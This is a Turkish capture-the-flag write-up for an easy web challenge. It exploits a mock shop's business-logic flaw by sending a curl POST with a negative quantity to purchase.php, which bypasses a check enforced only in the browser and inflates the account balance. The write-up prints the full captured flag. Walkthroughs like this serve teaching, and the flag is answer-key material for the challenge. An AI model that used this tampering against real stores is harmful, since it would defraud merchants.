# 🎯 Business Logic3 - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Kolay-darkgreen?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Business Logic-purple?style=for-the-badge" alt="Business Logic">
</p>

---

## 📋 Soru Bilgileri
  
**Kategori:** Web  
**Seviye:** Kolay  
**Puan:** 300

**Challenge URL:** http://64.226.74.243:2001/

---

## 🔍 Analiz

**Hedef:** Business Logic açığından yararlanarak flag'i almak

**Strateji:** Sayfa analizi → Satın alma mekanizmasını inceleme → Negatif miktar testi → Flag

**İpuçları:**
- 💰 "Bakiyeniz 0 TL" → Para yok ama alışveriş yapılabilir mi?
- 🛒 "Mantık hatası" → Business logic vulnerability
- 🔢 "Miktar kontrolü" → Quantity validation eksik olabilir
- 💡 Kolay seviye → Basit parameter manipulation

---

## ✅ Çözüm Adımları

### 🌐 **Adım 1: Hedef Sayfayı İnceleme**

**Siteye curl ile bağlanıyoruz:**

```bash
curl -v http://64.226.74.243:2001/
```

**Response:**

```html
<!DOCTYPE html>
<html lang="tr">
<head>
    <title>TechShop - Online Mağaza</title>
</head>
<body>
    <div class="container">
        <header>
            <h1>🛒 TechShop</h1>
            <p>En Yeni Teknolojik Ürünler</p>
            <div class="balance">
                💰 Bakiyeniz: <span id="balance">0</span> TL
            </div>
        </header>
        
        <div class="products" id="products-container"></div>
    </div>

    <script>
        const products = [
            { id: 1, name: "Gaming Laptop", price: 25000, image: "resimler/resim1.jpg" },
            { id: 2, name: "Mekanik Klavye", price: 1500, image: "resimler/resim2.jpg" },
            { id: 3, name: "Gaming Mouse", price: 800, image: "resimler/resim3.jpg" },
            { id: 4, name: "4K Monitör", price: 8000, image: "resimler/resim4.jpg" },
            { id: 5, name: "Kablosuz Kulaklık", price: 2500, image: "resimler/resim5.jpg" }
        ];

        let balance = 0;

        async function buyProduct(productId) {
            const product = products.find(p => p.id === productId);
            const quantity = parseInt(document.getElementById(`qty-${productId}`).value);
            
            try {
                const response = await fetch('purchase.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `product_id=${productId}&quantity=${quantity}`
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showMessage(data.message, 'success');
                    balance = data.new_balance;
                    document.getElementById('balance').textContent = balance.toLocaleString('tr-TR');
                } else {
                    showMessage(data.message, 'error');
                }
            } catch (error) {
                showMessage('Bir hata oluştu!', 'error');
            }
        }

        function updateQuantity(productId, change) {
            const input = document.getElementById(`qty-${productId}`);
            let value = parseInt(input.value) + change;
            if (value < 1) value = 1;
            input.value = value;
        }
    </script>
</body>
</html>
```

**Analiz:**
- ✅ Online mağaza sitesi
- ✅ Başlangıç bakiyesi: **0 TL**
- ✅ 5 ürün mevcut (25000 TL, 1500 TL, 800 TL, 8000 TL, 2500 TL)
- ✅ Satın alma endpoint'i: `purchase.php`
- ✅ POST parametreleri: `product_id`, `quantity`
- 💡 Client-side quantity kontrolü: `if (value < 1) value = 1;`

---

### 🔎 **Adım 2: Satın Alma Mekanizmasını Analiz Etme**

**JavaScript kodunu inceliyoruz:**

```javascript
async function buyProduct(productId) {
    const quantity = parseInt(document.getElementById(`qty-${productId}`).value);
    
    const response = await fetch('purchase.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `product_id=${productId}&quantity=${quantity}`
    });
    
    const data = await response.json();
    
    if (data.success) {
        balance = data.new_balance;
        document.getElementById('balance').textContent = balance.toLocaleString('tr-TR');
    }
}

function updateQuantity(productId, change) {
    const input = document.getElementById(`qty-${productId}`);
    let value = parseInt(input.value) + change;
    if (value < 1) value = 1; // Client-side kontrolü
    input.value = value;
}
```

**Analiz:**
- ⚠️ Client-side'da `value < 1` kontrolü var
- ⚠️ ANCAK bu sadece UI'da çalışıyor
- ⚠️ Direkt POST request gönderseK bypass edilebilir
- 💡 Backend'de negatif quantity kontrolü olmayabilir!

**Hipotez:**
```
Eğer negatif quantity gönderirsek:
total = price * quantity
total = 25000 * (-100) = -2,500,000
new_balance = 0 - (-2,500,000) = 2,500,000 TL 💰
```

---

### 🧪 **Adım 3: Negatif Miktar Testi**

**curl ile direkt POST request gönderiyoruz:**

```bash
curl -X POST http://64.226.74.243:2001/purchase.php \
  -d "product_id=1&quantity=-100"
```

**Response:**

```json
{
  "success": true,
  "message": "✅ Gaming Laptop başarıyla satın alındı!\n\n🎉 Tebrikler! FLAG'i buldunuz: Flag{ohoohirsizvarBedavaUrunaliyorlar}",
  "new_balance": 2500000
}
```

**🎉 FLAG ALINDI!**

**Analiz:**
- ✅ Negatif quantity kabul edildi
- ✅ Backend'de validation yok
- ✅ Bakiye: **2,500,000 TL** (0 - (-2,500,000))
- ✅ Flag mesajda döndü

---

## 🚩 **FLAG**

```
Flag{ohoohirsizvarBedavaUrunaliyorlar}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🌐<br><b>curl</b><br><sub>HTTP request</sub></td>
<td align="center">🔍<br><b>Browser DevTools</b><br><sub>Console & Network</sub></td>
<td align="center">📝<br><b>JSON Parser</b><br><sub>Response analysis</sub></td>
</tr>
</table>

**Kullanılan Komutlar:**
```bash
# Sayfa analizi
curl -v http://64.226.74.243:2001/

# Negatif quantity exploit
curl -X POST http://64.226.74.243:2001/purchase.php \
  -d "product_id=1&quantity=-100"
```

---

## 💭 **Çözüm Akış Şeması**

```
🎯 Business Logic3 Challenge
            ↓
🌐 Hedef sayfayı incele
   → Bakiye: 0 TL
   → Ürünler: 25000 TL - 2500 TL
            ↓
🔎 Satın alma mekanizması
   → POST purchase.php
   → Parameters: product_id, quantity
            ↓
🔍 Client-side analizi
   → updateQuantity() → if (value < 1) value = 1
   → ⚠️ Sadece UI kontrolü!
            ↓
💡 Hipotez
   → Negatif quantity göndersek?
   → Backend validation var mı?
            ↓
🧪 Negatif miktar testi
   → quantity=-100
   → curl -X POST purchase.php
            ↓
🎉 Exploit başarılı
   → new_balance: 2,500,000 TL
   → Flag mesajda döndü
            ↓
🚩 Flag{ohoohirsizvarBedavaUrunaliyorlar}
```
